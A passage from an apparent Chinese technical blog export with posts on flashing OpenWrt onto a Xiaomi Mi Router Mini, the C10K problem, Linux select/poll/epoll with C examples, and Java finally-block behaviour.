OpenWrt 路由器 shadowsocks 自动翻墙、科学上网教程 - https://fanqiang.software-download.name/ 小米路由器mini折腾之自动翻墙篇 - https://blog.phpgao.com/carzy_router.html Shadowsocks + GfwList 实现 OpenWRT / LEDE 路由器自动翻墙 - https://cokebar.info/archives/962 在路由器上部署 shadowsocks - https://zzz.buzz/zh/gfw/2016/02/16/deploy-shadowsocks-on-routers/ 小米路由器mini刷PandoraBox使用Shadowsocks - https://blog.nex3z.com/2015/12/20/%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8mini/ [经验技巧] 小米路由器mini配置SS+ChinaDNS实现自动XX - http://www.miui.com/thread-3067556-1-1.html 小米路由器mini折腾之配置opkg篇 - https://blog.phpgao.com/xiaomi_router_opkg.html OpenWrt-dist - http://openwrt-dist.sourceforge.net/ 小米路由器 mini 刷 OpenWrt/PandoraBox/LEDE - https://leamtrop.com/2017/05/11/flash-openwrt-squashfs/ OpenWrt Xiaomi Mi WiFi Mini - https://openwrt.org/toh/xiaomi/mini 小米mini安装openwrt - https://kknews.cc/zh-hk/tech/a8plgj.html 安装dnsmasq-full的时候先卸载了openwrt自带的dnsmasq，一直连接不上 - https://github.com/bettermanbao/openwrt-shadowsocksR-libev-full/issues/20","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【OpenWrt】小米路由器mini刷OpenWRT","date":"2019-01-30T07:41:57.000Z","path":"2019/01/30/【OpenWrt】小米路由器mini刷OpenWRT/","text":"刷小米官方开发版ROM从http://www.miwifi.com/miwifi_download.html ，下载并刷入小米官方开发版ROM。 刷SSH以获得root权限刷入小米官方开发版ROM（miwifi_r1cm_firmware_2e9b9_2.21.109.bin）后，获取SSH权限（期间需要下载一个miwifi_ssh.bin工具包，并通过U盘写入路由器）。 刷OpenWrt下载OpenWrt从downloads.openwrt.org，下载最新的OpenWrt ROM，当前（2019.1.29）最新的OpenWrt版本为18.06.1。 下载地址：https://downloads.openwrt.org/releases/18.06.1/targets/ramips/mt7620/openwrt-18.06.1-ramips-mt7620-miwifi-mini-squashfs-sysupgrade.bin。 scp 以将.bin到路由器刷入镜像使用 mtd 刷入镜像 1mtd -r write /tmp/openwrt|pandorabox|lede.bin firmware 如遇以下报错，改 firmware 为 OS1 即可。 12Could not open mtd device: firmwareCan&apos;t open device for writing! 到这里，等待刷入镜像，路由器自动重启，过一会才能登录。 注意！！！当系统安装完成后， LEDE 的指示灯是红色的，我在刷完之后，以为路由器显示红色指示灯，是因为成砖了，折腾了半天（事实上已经OpenWrt安装完成了） 而且刷完系统默认不开启无线网络，需要用网线连接到 LAN 口。 总结一句，千万注意刷完后，别管路由器的灯。而直接用网线将PC与路由器相连。 原始的opkg源配置1234567root@OpenWrt:~# cat /etc/opkg/distfeeds.confsrc/gz openwrt_core http://downloads.openwrt.org/releases/18.06.1/targets/ramips/mt7620/packagessrc/gz openwrt_base http://downloads.openwrt.org/releases/18.06.1/packages/mipsel_24kc/basesrc/gz openwrt_luci http://downloads.openwrt.org/releases/18.06.1/packages/mipsel_24kc/lucisrc/gz openwrt_packages http://downloads.openwrt.org/releases/18.06.1/packages/mipsel_24kc/packagessrc/gz openwrt_routing http://downloads.openwrt.org/releases/18.06.1/packages/mipsel_24kc/routingsrc/gz openwrt_telephony http://downloads.openwrt.org/releases/18.06.1/packages/mipsel_24kc/telephony 我们更新为中科大的库： 1234567root@OpenWrt:~# cat /etc/opkg/distfeeds.confsrc/gz openwrt_core http://mirrors.ustc.edu.cn/lede/releases/18.06.1/targets/ramips/mt7620/packagessrc/gz openwrt_base http://mirrors.ustc.edu.cn/lede/releases/18.06.1/packages/mipsel_24kc/basesrc/gz openwrt_luci http://mirrors.ustc.edu.cn/lede/releases/18.06.1/packages/mipsel_24kc/lucisrc/gz openwrt_packages http://mirrors.ustc.edu.cn/lede/releases/18.06.1/packages/mipsel_24kc/packagessrc/gz openwrt_routing http://mirrors.ustc.edu.cn/lede/releases/18.06.1/packages/mipsel_24kc/routingsrc/gz openwrt_telephony http://mirrors.ustc.edu.cn/lede/releases/18.06.1/packages/mipsel_24kc/telephony Reference [经验技巧] 【修复变砖的路由器】小米路由器U盘刷ROM/SSH失败的解决方案 - http://www.miui.com/thread-2062279-1-1.html 【U盘刷机】小米路由器变砖之后如何自救 - http://bbs.xiaomi.cn/t-11600650 小米 mini 路由器刷 openwrt - https://my.oschina.net/u/260165/blog/1603702 小米路由器mini开启ssh - https://www.jianshu.com/p/984d3c914e35 [固件] 【小米路由器mini刷机】mini刷潘多拉固件教程（固件已更新） - http://www.miui.com/thread-2036705-1-1.html 【荣组出品】mini玩机第一步：开启路由ROOT权限，开始玩机 - 小米路由器_MIUI论坛http://www.miui.com/thread-1995629-1-1.html","comments":true,"categories":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/categories/OpenWrt/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/tags/OpenWrt/"}]},{"title":"【Network】C10K问题与高性能网络编程入门","date":"2019-01-20T05:04:39.000Z","path":"2019/01/20/【Network】高性能网络编程-C10K问题与高性能网络编程入门/","text":"C10K 问题C10K是服务器应用领域很古老很出名的一个问题，大意是说单台服务器要同时支持并发 10K 量级的连接。 即「在同时连接到服务器的客户端数量超过 10000 个的环境中，即便硬件性能足够， 依然无法正常提供服务」，简而言之，就是如何让单机具备处理1万个并发连接，且这些连接可能是保持存活状态。这个概念最早由 Dan Kegel 在1999年提出并发布于其个人站点（ http://www.kegel.com/c10k.html ）。 C10K问题的解决方案探讨要解决这一问题，从纯网络编程技术角度看，主要思路有两个： 思路一：对于每个连接处理分配一个独立的进程/线程； 思路二：用同一进程/线程来同时处理若干连接。 思路一：每个进程/线程处理一个连接这一思路最为直接，即每一个新连接到来，都为其创建一个对应的线程来处理。 由于申请和销毁进程/线程都会消耗相当可观的系统资源（CPU和内存），而且大量地进行线程上下文切换会导致CPU效率不高（CPU的计算资源未得到充分利用），因此这种方案不具备良好的可扩展性。当连接数较少时，可以获得很快的响应速度。而当连接量大大增加时，响应速度会呈指数性下降。 传统的Apache，Tomcat均采用这个思路进行实现。它本质上基于传统的同步阻塞I/O模型。 因此，这一思路在服务器资源还没有富裕到足够程度的时候，是不可行的。即便资源足够富裕，效率也不够高。总之，此思路技术实现会使得资源占用过多，可扩展性差。 思路二：每个进程/线程同时处理多个连接同步非阻塞I/O模型在思路一中，本质上是由于线程不断被阻塞导致的效率低下。因此，很自然的联想到，是否存在一种非阻塞的调用方式呢。 Linux的read()系统调用就为我们提供了非阻塞的调用，如下图所示： 可以看到，用户线程需要不停地发送系统调用以获取这个I/O操作的最新状态，这个过程称为轮询（poll）。 虽然用户线程不再被阻塞了，但用户线程需要不断地进行轮询，轮询过程会消耗额外的CPU资源。因此CPU的有效利用率同样不高。 I/O多路复用（I/O Multiplexing）我们希望，用户线程不需要进行不停的轮询，以避免消耗额外的CPU资源。同时，用户线程处于休眠状态（sleep），而当一个或多个文件描述符对应的I/O操作数据准备完成时，用户线程被唤醒，以去处理这些I/O操作。 I/O多路复用（I/O Multiplexing）技术正是为了满足上面的需求而诞生的。I/O多路复用基于同步非阻塞模型（Synchronous non-blocking model）+ 轮询技术（poll）。 I/O多路复用使得用户线程可以并发的阻塞在多个文件描述符上，当其中任何一个文件描述符对应的I/O操作准备就绪时，控制流被返回给用户线程，用户线程从休眠状态切换成活跃状态。 I/O多路复用从技术实现上又分很多种，在Linux中，包括select、poll和epoll，我们逐一来看看IO多路复用各种实现方式的优劣。 I/O多路复用 - selectI/O多路复用技术的出现，使得用户线程可以监控多个socket（本质上是多个文件描述符），当其中任何一个文件描述符的状态发生指定变化（例如，由不可用变为可用）或超时时，则select()调用返回。 select的效率已经比上面几种模型高太多了，然而，它也有一些不足。 由于存储文件描述符的集合fd_set是数组类型，且其可存储的元素的数量（FD_SETSIZE）有一个上限值。 而且，select()对应处理文件描述符的索引值较大的情况时，效率不高。在select()中，如果仅仅检测一个值为900的文件描述符时，内核需要从0开始扫描各个文件描述符，直到第900个（因为在调用select()时，需要传入值最大的文件描述符的数字）。 另外，select()调用的初始化较为繁琐。在select()中，文件描述符集合会在select()调用返回时重新构造，因此在下一次调用select()时，必须重新构造文件描述符集合。 更主要的是，select()在每一次检查监听的文件描述符状态变化时，都需要遍历一次用户传入的文件描述符集合，因而如果当文件描述符的数量很多时，一次集合遍历将会非常耗时。 1int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); 思路：有连接请求抵达了再检查处理。 问题：文件描述符数量有上限+重复初始化+逐个检查文件描述符的变化状态效率不高。 I/O多路复用 - pollpoll 主要解决 select 的前两个问题：动态地确定文件描述符数量以消除文件描述符数量上限问题，同时使用不同字段分别标注关注事件和发生事件，来避免重复初始化。 然而poll仍然会每隔一定的时间，逐个扫描用户传入的所有文件描述符的变化状态，直到当其中任何一个文件描述符的状态发生指定变化或超时，因而效率也相对不高。 1int poll(struct pollfd *fds, nfds_t nfds, int timeout); 思路：设计新的数据结构提供使用效率。 问题：逐个检查文件描述符的变化状态效率不高。 I/O多路复用 - epoll epoll从内核层面解决了select和poll中，需要每隔一定的时间逐个检查关注的文件描述符的变化状态，因而效率不高的问题。 epoll 采用了这种设计，适用于大规模的应用场景。 实验表明，当文件句柄数目超过 10 之后，epoll 性能将优于 select 和 poll；当文件句柄数目达到 10K 的时候，epoll 已经超过 select 和 poll 两个数量级。 1int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout); 思路：只返回状态变化的文件句柄。 问题：依赖特定平台（Linux）。 因为Linux是互联网企业中使用率最高的操作系统，Epoll就成为C10K killer、高并发、高性能、异步非阻塞这些技术的代名词了。FreeBSD推出了kqueue，Linux推出了epoll，Windows推出了IOCP，Solaris推出了/dev/poll。这些操作系统提供的功能就是为了解决C10K问题。epoll技术的编程模型就是同步非阻塞回调，也可以叫做Reactor，事件驱动，事件轮循（EventLoop）。 Nginx，libevent，Node.js这些就是epoll时代的产物。 libevent由于epoll, kqueue, IOCP每个接口都有自己的特点，程序移植非常困难，于是需要对这些接口进行封装，以让它们易于使用和移植，其中libevent库就是其中之一。 libevent提供跨平台，封装底层平台的调用，提供统一的 API，但底层在不同平台上自动选择合适的调用。按照libevent的官方网站，libevent库提供了以下功能：当一个文件描述符的特定事件（如可读，可写或出错）发生了，或一个定时事件发生了，libevent就会自动执行用户指定的回调函数，来处理事件。目前，libevent已支持以下接口/dev/poll, kqueue, event ports, select, poll 和 epoll。Libevent的内部事件机制完全是基于所使用的接口的。因此libevent非常容易移植，也使它的扩展性非常容易。目前，libevent已在以下操作系统中编译通过：Linux，BSD，Mac OS X，Solaris和Windows。使用libevent库进行开发非常简单，也很容易在各种unix平台上移植。解决C10K Nginx正是解决C10K问题的一个产物。 C10K 到 C10M随着技术的演进，epoll 已经可以较好的处理 C10K 问题，但是如果要进一步的扩展，例如支持 10M 规模的并发连接，原有的技术就无能为力了。 那么，新的瓶颈在哪里呢？ 从前面的演化过程中，我们可以看到，根本的思路是要高效的去阻塞，让 CPU 可以干核心的任务。 当连接很多时，首先需要大量的进程/线程来做事。同时系统中的应用进程/线程们可能大量的都处于 ready 状态，需要系统去不断的进行快速切换，而我们知道系统上下文的切换是有代价的。虽然现在 Linux 系统的调度算法已经设计的很高效了，但对于 10M 这样大规模的场景仍然力有不足。 所以我们面临的瓶颈有两个，一个是进程/线程作为处理单元还是太厚重了；另一个是系统调度的代价太高了。 很自然地，我们会想到，如果有一种更轻量级的进程/线程作为处理单元，而且它们的调度可以做到很快（最好不需要锁），那就完美了。 这样的技术现在在某些语言中已经有了一些实现，它们就是 coroutine（协程），或协作式例程。具体的，Python、Lua 语言中的 coroutine（协程）模型，Go 语言中的 goroutine（Go 程）模型，都是类似的一个概念。实际上，多种语言（甚至 C 语言）都可以实现类似的模型。 它们在实现上都是试图用一组少量的线程来实现多个任务，一旦某个任务阻塞，则可能用同一线程继续运行其他任务，避免大量上下文的切换。每个协程所独占的系统资源往往只有栈部分。而且，各个协程之间的切换，往往是用户通过代码来显式指定的（跟各种 callback 类似），不需要内核参与，可以很方便的实现异步。 Reference The C10K problem - http://www.kegel.com/c10k.html Wikipedia C10k problem- https://en.wikipedia.org/wiki/C10k_problem 《Unix Network Programming, Volume 1: The Sockets Networking API: Sockets Networking API》 《Linux System Programming Talking Directly to the Kernel and C Library》 高性能网络编程(二)：上一个10年，著名的C10K并发连接问题 - http://www.52im.net/thread-566-1-1.html C10K 问题引发的技术变革 - https://blog.csdn.net/yeasy/article/details/43152115 程序员怎么会不知道 C10K 问题呢 - https://medium.com/@chijianqiang/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E4%B9%88%E4%BC%9A%E4%B8%8D%E7%9F%A5%E9%81%93-c10k-%E9%97%AE%E9%A2%98%E5%91%A2-d024cb7880f3 高性能网络编程(六)：一文读懂高性能网络编程中的线程模型 - http://www.52im.net/thread-1939-1-1.html select / poll / epoll: practical difference for system architects - https://www.ulduzsoft.com/2014/01/select-poll-epoll-practical-difference-for-system-architects/","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"},{"name":"NetworkProgramming","slug":"Network/NetworkProgramming","permalink":"http://swsmile.info/categories/Network/NetworkProgramming/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"},{"name":"Network Programming","slug":"Network-Programming","permalink":"http://swsmile.info/tags/Network-Programming/"}]},{"title":"【Linux】Linux中的I/O轮询技术","date":"2019-01-19T05:04:03.000Z","path":"2019/01/19/【Linux】IO-Linux中的轮询技术/","text":"轮询技术下文将介绍Linux中的四种轮询技术，分别是： read() select() poll() epoll() read()轮询技术对应于同步非阻塞I/O模型，每次轮询只能获知一个I/O操作对应的状态，轮询操作由用户负责。 select()、poll()、epoll()轮询技术对应于I/O多路复用（I/O Multiplexing），每次轮询可检测多个I/O操作的状态，轮询（poll）操作由操作系统负责（而用户线程调用对应的轮询函数时会被阻塞）。 注意： 以下这些轮询技术都分别对应一种逻辑上的轮询方法（Function）。而每一种轮询方法，内核都会以系统调用（本质是一个或一系列的C语言函数）的形式提供给用户线程进行调用； 轮询技术仅仅描述了当用户已经发起I/O操作后，从“用户线程获取这些I/O操作是否已经完成”的过程； 这些轮询技术对应的轮询方法都会阻塞用户线程。换句话说，若所有监听的文件描述符对应的I/O操作在很长时间内都没有完成，在这段时间内，这些轮询方法都不会返回控制流给用户线程。 read 方法 - 同步非阻塞I/O模型123#include &lt;unistd.h&gt;ssize_t read(int fildes, void *buf, size_t nbyte); read轮询方法对应read()系统调用。即用户线程需要在一定时间间隔内非阻塞地持续发起轮询请求来获知此I/O操作的当前状态。因此，轮询操作是由用户线程来负责的。 虽热用户线程不会被阻塞，但它需要不停地发起系统调用，直到数据可用为止。 它是较原始、性能较低的一种，不仅整体数据吞吐量较低，而且（相较于阻塞式系统调用）消耗了额外的CPU资源。 I/O多路复用（I/O Multiplexing）我们希望，用户线程不需要进行不停的轮询，以避免消耗额外的CPU资源。同时，在数据就就绪时，用户线程处于休眠状态（sleep）。而当一个或多个文件描述符对应的I/O操作数据准备完成时，用户线程被唤醒，并去处理这些I/O操作。 I/O多路复用（I/O Multiplexing）技术正是为了满足上面的需求而诞生的。I/O多路复用基于同步非阻塞模型（Synchronous non-blocking model）+ 轮询技术（poll）。 I/O多路复用使得用户线程可以并发的阻塞在多个文件描述符上，当其中任何一个文件描述符对应的I/O操作准备就绪时，控制流被返回给用户线程，用户线程从休眠状态切换成活跃状态。 I/O多路复用从技术实现上又分很多种，在Linux中，包括select、poll和epoll，我们逐一来看看I/O多路复用各种实现方式的优劣。 select 方法select是一种I/O多路复用模型。select 可以让内核在”多个文件描述符对应的I/O操作中任何一个完成时”或”经过指定时间后”，唤醒（wake）并通知用户线程（在唤醒之前，用户线程因为被阻塞而处于休眠状态（sleep））。比如： 当1、4或5中任何一个文件描述符的状态为可读时； 当4、7中任何一个文件描述符的状态为可写时； 当6、8中任何一个文件描述符的处理过程中抛出异常时； 经过10.2秒后。 注意，select()仅仅负责轮询工作： 在调用select()之前，需要调用read()以发起一个读取I/O操作（此后才需要轮询操作）； 在调用select()之后，需要再次调用read()以将数据从内核空间读取到用户空间，并最终将数据返回给用户线程 123456789101112#include &lt;sys/select.h&gt;int select (int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);FD_CLR(int fd, fd_set *set); FD_ISSET(int fd, fd_set *set); FD_SET(int fd, fd_set *set); FD_ZERO(fd_set *set); n是一个int类型，为值最大的文件描述符的数值。比如我想监控1、3、8、10这四个文件描述符，则n为10。 总结 它是在read的基础上改进的一种方案，通过对文件描述符上的事件状态来进行判断； 以同步的方式实现了I/O多路复用； 调用select()时，需要指定三组期望被观察的文件描述符集合（readfds、writefds和exceptfds）。 解释 期望被观察的文件描述符分为三组，对于readfds，被包含在readfds集合中文件描述符会被内核观察，当任何一个文件描述符的状态变化为数据可读时，select()函数被返回；类似地，对于writefds，当这个集合中任何一个文件描述符的状态变化为数据可写时，select()函数被返回；对于exceptfds，当其中的任何一个文件描述符的处理抛出异常时； 当select()函数被返回时，三组文件描述符集合会被修改，即只包含那些对应数据已经准备完成的文件描述符。比如，readfds文件描述符集合中包含7和9两个文件描述符，当select()函数被返回时，只有文件描述符7包含在新的readfds文件描述符集合中（因为，此时只有文件描述符7对应的I/O操作完成了，即数据可用）。 select()会返回在三组期望被观察的文件描述符集合（readfds、writefds和exceptfds）中，已经准备就绪的文件描述符的数量的总和。如果发生错误，则返回-1。 在select()中，如果仅仅检测一个值为900的文件描述符时，内核需要从0开始扫描各个文件描述符，直到第900个（在调用select()时，需要传入值最大的文件描述符的数字） 更多细节请查询《Linux System Programming Talking Directly to the Kernel and C Library》P53。 一个完整的select调用例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt; #include &lt;sys/time.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;#define TIMEOUT 5 /* select timeout in seconds */#define BUF_LEN 1024 /* read buffer in bytes */int main (void) &#123; struct timeval tv; fd_set readfds; int ret; /* Wait on stdin for input. */ FD_ZERO(&amp;readfds); FD_SET(STDIN_FILENO, &amp;readfds); /* Wait up to five seconds. */ tv.tv_sec = TIMEOUT; tv.tv_usec = 0; /* All right, now block! */ ret = select (STDIN_FILENO + 1, &amp;readfds, NULL, NULL, &amp;tv); if (ret == −1) &#123; perror (\"select\"); return 1; &#125; else if (!ret) &#123; printf (\"%d seconds elapsed.\\n\", TIMEOUT); return 0; &#125; /* * Is our file descriptor ready to read? * (It must be, as it was the only fd that * we provided and the call returned * nonzero, but we will humor ourselves.) */ if (FD_ISSET(STDIN_FILENO, &amp;readfds)) &#123; char buf[BUF_LEN+1]; int len; /* guaranteed to not block */ len = read (STDIN_FILENO, buf, BUF_LEN); if (len == −1) &#123; perror (\"read\"); return 1; &#125; if (len) &#123; buf[len] = '\\0'; printf (\"read: %s\\n\", buf); &#125; return 0; &#125; fprintf (stderr, \"This should not happen!\\n\"); return 1;&#125; poll 方法poll在select的基础之上进行改进，并避免不需要的检查。但是，当文件描述符较多的时候，它的性能还是十分低下的。通过poll 实现的轮询与select相似，但性能限制有所改善。 123456789#include &lt;poll.h&gt; int poll (struct pollfd *fds, nfds_t nfds, int timeout);struct pollfd &#123; int fd; /* file descriptor */ short events; /* requested events to watch */ short revents; /* returned events witnessed */&#125;; 解释 每一个pollfd结构体对应一个被观察的文件描述符； 在pollfd结构体中，events字段表示期望被观察的事件（以事件为位掩码表示）；revents字段表示被内核观察到的事件，这个字段由内核来设置。因此，所有在events字段中被指定的事件都可能出现在revents中； 与select()不同的是，在poll()中，不需要指定对于异常的监测； poll()会返回发生了观察事件的文件描述符的数量。当返回0时，说明在达到超时时间后，仍然没有反生任何观察事件；而返回-1说明发生了错误。 一个完整的poll调用例子12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;poll.h&gt;#define TIMEOUT 5 /* poll timeout, in seconds */int main (void) &#123; struct pollfd fds[2]; int ret; /* watch stdin for input */ fds[0].fd = STDIN_FILENO; fds[0].events = POLLIN; /* watch stdout for ability to write (almost always true) */ fds[1].fd = STDOUT_FILENO; fds[1].events = POLLOUT; /* All set, block! */ ret = poll (fds, 2, TIMEOUT * 1000); if (ret == −1) &#123; perror (\"poll\"); return 1; &#125; if (!ret) &#123; printf (\"%d seconds elapsed.\\n\", TIMEOUT); return 0; &#125; if (fds[0].revents &amp; POLLIN) printf (\"stdin is readable\\n\"); if (fds[1].revents &amp; POLLOUT) printf (\"stdout is writable\\n\"); return 0;&#125; poll() vs select()poll()基于select()进行改进： poll()不需要用户计算文件描述符集合数量的最大值； poll()对应处理文件描述符的索引值较大的情况时，效率更高。具体来说，在select()中，如果仅仅检测一个值为900的文件描述符时，内核需要从0开始扫描各个文件描述符，直到第900个（因为在调用select()时，需要传入值最大的文件描述符的数字）；而在poll()中，只需要传入一个长度为1的pollfd数组，从而避免了从1-900的文件描述符扫描； 开发者在调用poll()时，更加方便。在select()中，文件描述符集合会在select()调用返回时重新构造，因此在下一次调用select()时，必须重新构造文件描述符集合；而在poll()中，由于events域和revents域分离，在下一次调用poll()时，开发者不需要再重新构造文件描述符集合。 epoll 方法由于在select()和poll()中，每一次检查监听的文件描述符状态变化时，都需要遍历一次用户传入的文件描述符集合，因而如果当文件描述符的数量很多时，一次集合遍历将会非常耗时。 为了解决这个问题，在select()和poll()的基础上进行优化，在Linux kernel 2.6中，引入了event poll（epoll）方法。 epoll将文件描述符的监测声明和真正的监测进行了分离。 从实现的角度来说，epoll会创建一个epoll实例，这个epoll实例对应一个文件描述符。同时，这个epoll实例中包含一个文件描述符集合（称为epoll set或interest list），集合中存储了所有希望被监听的文件描述符。当某个文件描述符对应的I/O操作完成时，这个文件描述符会被放入ready list，ready list是epoll set的子集。 该方案是Linux下效率最高的I/O事件通知机制。本质在于epoll基于内核层面的事件通知。具体来说，epoll不是在用户线程发起轮询调用后，不断地去检查所有监听的文件描述符是否状态发生变化（而poll和select是这样做的），而是在当这些文件描述符中任何一个发生状态变化时，内核就将这些对应的文件描述符移动到epoll实例中的ready list中（这里发生了一次内核事件通知）。因此，当用户线程调用轮询方法epoll_wait时，内核不再需要进行一次文件描述符的状态变化检查的遍历，而是直接返回结果。 下图为通过epoll方式实现轮询的示意图。 使用epoll的步骤epoll对应一组系统调用，包括epoll_create, epoll_ctl, epoll_wait。 epoll_create - 创建epoll上下文对象12345#include &lt;sys/epoll.h&gt;int epoll_create1 (int flags);/* deprecated. use epoll_create1() in new code. */int epoll_create(int size); size参数标示了希望被监听的文件描述符的数量。从Linux 2.6.8后，这个参数被忽略（当其数量发生变化时，内核会动态的计算文件描述符的数量） 调用epoll_create()会返回一个文件描述符，这个文件描述符对应一个epoll实例。用户线程通过这个文件描述符来增加、删除或者修改希望被观察的文件描述符（epoll实例中存储了一个文件描述符集合（称为epoll set或interest list），集合中包含所有希望被观察的文件描述符）。 epoll_ctl - 添加/删除文件描述符到epoll上下文对象中123456789101112#include &lt;sys/epoll.h&gt;int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);struct epoll_event &#123; __u32 events; /* events */ union &#123; void *ptr; int fd; __u32 u32; __u64 u64; &#125; data;&#125;; epfd —对应于通过调用 epoll_create创建的 epoll实例的文件描述符； op — 对文件描述符的操作，通常来说包括增加、删除、修改操作。比如，”添加“表示添加这个文件描述符到文件描述符集合中； *fd — *希望被添加到epoll list中的文件描述符； 用户线程调用 epoll_ctl可以添加新的希望被观察的文件描述符到epoll实例的epoll set中。当文件描述符对应的I/O操作完成时，这个文件描述符会被放入ready list，ready list是epoll set的子集。 在上图中，进程483注册了文件描述符fd1、fd2、fd3、fd4和fd5在epoll实例中（这5个文件描述符存储在epoll实例的interest list中）。此时，fd2、fd3和fd4对应的I/O操作完成了，fd2、fd3和fd4就会移动到了ready list中（ready list是interest list的子集）。 epoll_wait当用户线程调用epoll_wait()后，用户线程会被阻塞，直到任何一个被监听的文件操作符对应的I/O操作完成。 12#include &lt;sys/epoll.h&gt;int epoll_wait(int epfd, struct epoll_event *evlist, int maxevents, int timeout); epfd —对应于通过调用 epoll_create创建的 epoll实例的文件描述符； evlist —是一个 epoll_event 结构数组，当调用 epoll_ctl()时会被返回。当调用epoll_wait()时，这个数组会修改，以标示哪些I/O操作完成了（从实现的角度来说，这些I/O操作对应的文件操作符会被移动到ready list集合中）。 epoll的应用 Node.js使用libuv，而libuv正是基于epoll Python的gevent网络库使用libevent，而libevent基于epoll 总结相比较select/poll模型和epoll模型： select/poll模型的代价为O(N)，因此，当N很大时（比如，一个Web服务器连接了一万个客户端，而这些客户端与服务器的交互频率很低），当调用select()/poll()后，每一次进行轮询时，内核都需要扫描用户传入的文件描述符集合中所有的文件描述符（尽管此时只有个别的文件描述符状态改变了），以了解这些文件描述符中到底哪些文件描述符的状态改变了。 而在epoll中，当某个文件描述符的状态改变时（发生了一次内核层面的事件通知），内核会直接将这个文件描述符添加到ready list中（而不是等到用户线程调用epoll_wait时才执行这个操作）。因此，当用户线程调用轮询方法epoll_wait时，内核不再需要进行一次文件描述符的状态变化检查的遍历，而是直接返回结果。因此，epoll的代价为O(1)。 其他操作系统中的epollkqueuekqueue 方法的实现方式与epoll类似，不过它仅在FreeBSD系统下存在（包括macOS）。 IOCPIOCP相当于Windows下的epoll。 event portsevent ports相当于Solaris下的epoll。 总结在同步非阻塞I/O中，需要使用轮询技术。虽然在用户线程发起I/O操作（Operation）后，用户线程不会被阻塞。因此，虽然理论上，此时用户线程可以去处理其他任务；但事实上，用户线程仍然需要去执行轮询，以确认I/O操作是否完成了（若完成了，则执行对应的后续操作）。 而I/O多路复用对应的轮询技术对应的轮询方法（select()，poll()，epoll()）都会阻塞用户线程。换句话说，若所有监听的文件描述符对应的I/O操作在很长时间内都没有完成，在这段时间内，这些轮询方法都不会返回控制流给用户线程。 Reference 《Unix Network Programming, Volume 1: The Sockets Networking API: Sockets Networking API》 《Linux System Programming Talking Directly to the Kernel and C Library》 I/O Multiplexing - http://www.cs.toronto.edu/~krueger/csc209h/f05/lectures/Week11-Select.pdf 6.2. Waiting for I/O - http://faculty.salina.k-state.edu/tim/ossg/Device/io_wait.html The method to epoll’s madness - https://medium.com/@copyconstruct/the-method-to-epolls-madness-d9d2d6378642 Overview of Blocking vs Non-Blocking - https://nodejs.org/en/docs/guides/blocking-vs-non-blocking/ Chapter 6. I/O Multiplexing: The select and poll Functions - https://notes.shichao.io/unp/ch6/ Synchronous and Asynchronous I/O - https://docs.microsoft.com/en-us/windows/desktop/fileio/synchronous-and-asynchronous-i-o non-blocking IO vs async IO and implementation in Java - https://stackoverflow.com/questions/25099640/non-blocking-io-vs-async-io-and-implementation-in-java https://www.rubberducking.com/2018/05/the-various-kinds-of-io-blocking-non.html read(3) - Linux man page - https://linux.die.net/man/3/read","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"},{"name":"Linux","slug":"OperatingSystem/Linux","permalink":"http://swsmile.info/categories/OperatingSystem/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"},{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Java】Java关键字 - finally关键字","date":"2019-01-18T12:57:02.000Z","path":"2019/01/18/【Java】Java关键字-finally关键字/","text":"[例子1] final的意义123456789public static int test1()&#123; int i = 0; try&#123; System.out.println(\"try\"); //1 return i; &#125;finally &#123; System.out.println(\"finally\"); //2 &#125; &#125; 执行结果12tryfinally 分析无论try语句或catch语句中是否有return语句，finally语句都一定会被执行。 总结总结来说，我们可以把必须要执行的操作（比如资源释放操作：关闭流、关闭数据库连接，释放锁）放到finally语句里，以确保其一定会被执行。 在某些情况下，try语句压根就没有执行到，那么finally语句也一定就不会执行到了。 还有一种情况，就是在try块中有System.exit(0);这样的语句，System.exit(0);会终止Java虚拟机（JVM）。因此，连JVM都停止了，当然finally语句也不会被执行到。 [例子2]我们再来看一个程序： 12345678910111213141516171819202122232425public class Main &#123; public static void main(String[] args) &#123; System.out.println(test4()); &#125; public static int test4() &#123; int b = 20; try &#123; System.out.println(\"try block\"); b = b / 0; return 1; &#125; catch (Exception e) &#123; b += 15; System.out.println(\"catch block\"); &#125; finally &#123; System.out.println(\"finally block\"); if (b &gt; 25) &#123; System.out.println(\"b&gt;25, b = \" + b); &#125; b += 50; &#125; return 204; &#125;&#125; 结果12345try blockcatch blockfinally blockb&gt;25, b = 35204 说明打印204说明，当在执行try语句块的过程中抛出异常，则会直接进入catch语句（前提当然是存在catch语句），而对于在try 语句块中的抛出异常位置后的代码，不会被执行。 [例子3]再来看一个程序： 123456789101112131415161718public class FinallyTest1 &#123; public static void main(String[] args) &#123; System.out.println(test11()); &#125; public static String test11() &#123; try &#123; System.out.println(\"try block\"); return test12(); &#125; finally &#123; System.out.println(\"finally block\"); &#125; &#125; public static String test12() &#123; System.out.println(\"test12\"); return \"test12 return\"; &#125; &#125; 结果1234try blocktest12finally blocktest12 return 说明return statement先于finally block被打印，这说明: System.out.println(&quot;try block&quot;);先被执行 开始执行return test12();中的test12()： 执行System.out.println(&quot;return statement&quot;); 执行test12()的return &quot;test12 return&quot;，即函数test11的返回值被赋值为test12 return； 执行finally语句中的System.out.println(&quot;finally block&quot;); test11()函数返回，返回值为test12 return； 